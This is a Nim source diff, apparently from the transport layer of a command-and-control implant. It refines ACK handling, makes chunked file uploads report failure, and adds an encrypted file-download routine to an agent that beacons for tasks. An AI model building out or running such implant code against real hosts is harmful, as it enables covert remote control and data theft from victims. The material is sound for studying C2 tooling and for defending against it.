@@ -161,13 +161,18 @@ proc beacon*(t: var AgentTransport): seq[TaskWire] =
   except:
     t.reconnect()
 
-proc recvAck(t: var AgentTransport) =
+proc recvAck(t: var AgentTransport): bool =
   ## Read and discard the server's ACK. Must be called after every result/upload
   ## send to keep the framing in sync — the server always responds with {"t":"ack"}.
   try:
-    discard readFrame(t.sock)
+    let frame = readFrame(t.sock)
+    if frame.len == 0: return false
+    let response = parseJson(frame)
+    if response{"t"}.getStr("") != "ack": return false
+    return response{"p", "ok"}.getBool(true)
   except:
     t.reconnect()
+  return false
 
 proc sendResultAdmin*(t: var AgentTransport; taskId: int64;
                       output, errStr: string; isAdmin: bool) =
@@ -178,7 +183,7 @@ proc sendResultAdmin*(t: var AgentTransport; taskId: int64;
     let encB64 = base64.encode(cast[string](enc))
     let msg    = %*{"t": "result", "p": encB64}
     writeFrame(t.sock, $msg)
-    t.recvAck()
+    discard t.recvAck()
   except:
     t.reconnect()
 
@@ -186,7 +191,7 @@ proc sendResult*(t: var AgentTransport; taskId: int64; output, errStr: string) =
   t.sendResultAdmin(taskId, output, errStr, false)
 
 proc uploadFile*(t: var AgentTransport; taskId: int64;
-                 filename: string; data: seq[byte]) =
+                 filename: string; data: seq[byte]): bool =
   const chunkSize = 8 * 1024 * 1024
   let totalChunks = max(1, (data.len + chunkSize - 1) div chunkSize)
   let fileId = $taskId
@@ -204,9 +209,28 @@ proc uploadFile*(t: var AgentTransport; taskId: int64;
       let encB64 = base64.encode(cast[string](enc))
       let msg    = %*{"t": "upload_chunk", "p": encB64}
       writeFrame(t.sock, $msg)
-      t.recvAck()
+      if not t.recvAck(): return false
+    return true
   except:
     t.reconnect()
+    return false
 
 proc downloadFile*(t: var AgentTransport; filename: string): seq[byte] =
-  return @[]
+  try:
+    let request = %*{"filename": filename}
+    let enc = sealGCM(t.aesKey, cast[seq[byte]]($request))
+    let msg = %*{"t": "download", "p": base64.encode(cast[string](enc))}
+    writeFrame(t.sock, $msg)
+    let response = parseJson(readFrame(t.sock))
+    if response{"t"}.getStr("") != "dl_resp": return @[]
+    let encrypted = cast[seq[byte]](base64.decode(response{"p"}.getStr("")))
+    let plain = openGCM(t.aesKey, encrypted)
+    if plain.len == 0: return @[]
+    let body = parseJson(cast[string](plain))
+    if not body{"found"}.getBool(false): return @[]
+    let data = body{"data"}.getStr("")
+    if data == "": return @[]
+    return cast[seq[byte]](base64.decode(data))
+  except:
+    t.reconnect()
+    return @[]
